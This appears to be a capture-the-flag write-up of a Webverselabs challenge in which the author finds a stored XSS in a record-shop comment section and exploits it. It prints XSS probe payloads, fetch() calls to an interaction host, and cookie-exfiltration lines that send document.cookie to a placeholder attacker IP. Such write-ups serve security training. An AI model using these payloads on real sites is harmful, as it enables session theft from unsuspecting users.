---
title: "Webverselabs Crate & Sleeve Challenge XSS  "
date: 2026-05-20 00:00:00 +0000
categories: [Webverselabs]
tags: [Webverselabs , Medium , Challenge , Web_Attacks ]
---



## Scenario : 

Crate & Sleeve has run since 2014 on volunteer hosting and member dues — no auction bots, no eBay scraping, no premium tier. About four hundred records in rotation, a handful of moderators who scan the latest comments on their lunch break, and a codebase a college friend wrote one summer and never came back to. The comment thread is where regulars haggle over pressing variants and condition grades; it's also the part of the site the moderators trust their members on the most.


## Solution : 


<img width="1465" height="884" alt="image" src="https://github.com/user-attachments/assets/9bc4d3ea-b48b-4c3b-942d-b5c9b0a554e3" />

We first start by navigating the application just like a normal user , we create an account , use every feature , visit every endpoint , and what i found was this parameter when we visit the /listing endpoint : 

<img width="1466" height="797" alt="image" src="https://github.com/user-attachments/assets/7df06774-6f36-4871-9ed0-295127c487c9" />

I tried some basic XSS payloads on it but that didn't work , but we do have a comment section , where we can add our comment , firt thing i like to test these quick payloads : 

```bash
# Quick Checks : 

==> This will show origin IP : 
<script>alert(window.origin)</script>

==> If alert is blocked : 
<script>print()</script> 

==> If Script is blocked : 
<img src="" onerror=alert(window.origin)>

==> Cookie Exfiltration : 
#"><img src=/ onerror=alert(document.cookie)>

```

<img width="1415" height="771" alt="image" src="https://github.com/user-attachments/assets/202334c9-1577-4aea-bddc-c401a8fb70fa" />

We find that even after refreshing the page , our payload is still there and it executes everytime we refresh the page , which means this is a Stored XSS :

<img width="1448" height="721" alt="image" src="https://github.com/user-attachments/assets/36522bcb-905f-48f8-ab1f-e67266fed3f7" />

Now usually to abuse a stored XSS we would host JS file where we put our payload to steal the cookie then use a different payload to go fetch for our hosted file , But before let's check to see if we can fetch our server , for this one i will be using the Server given to us by Webverselabs to test for OOB : 

<img width="1902" height="491" alt="image" src="https://github.com/user-attachments/assets/fcd4bff1-6149-4bf3-aa33-eea64fb5d6f3" />

Here is the payload i used : 

```bash
<script>fetch('http://14b09583-4327-inscription-54577.interact.webverselabs-pro.com)</script>
```
<img width="1913" height="420" alt="image" src="https://github.com/user-attachments/assets/c9c2d3d2-54e3-4ff8-8ee2-fd653433f2ba" />

Perfect , we do get a callback , now all we need to do is host our JS file , Webverselabs also allows us to host files , for cookie stealing we can use one of these 2 payloads : 

```bash
document.location='http://OUR_IP/index.php?c='+document.cookie; 
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
<img width="1915" height="581" alt="image" src="https://github.com/user-attachments/assets/92daec88-4a4b-4855-952d-ba352e2affa0" />

Now all we need to do is use a payload that will fetch for our file :

```bash
<script>fetch('http://14b09583-4327-inscription-54577.interact.webverselabs-pro.com/script.js)</script>
```

Now once we submit this : 

<img width="1485" height="854" alt="image" src="https://github.com/user-attachments/assets/5bd19511-22c4-4b22-a926-3eb8f891e7da" />

Each time a new user will visit this page , it will trigger our payload which will callback our server to fecth for script.js and execute it to steal their cookie : 

<img width="1902" height="623" alt="image" src="https://github.com/user-attachments/assets/c71e0315-2ce2-4ac8-923d-b0ee1205e521" />

We see that each time we get a callback which means our payloads is stored and being executed .

That was it for this challenge . See you in the next one :)
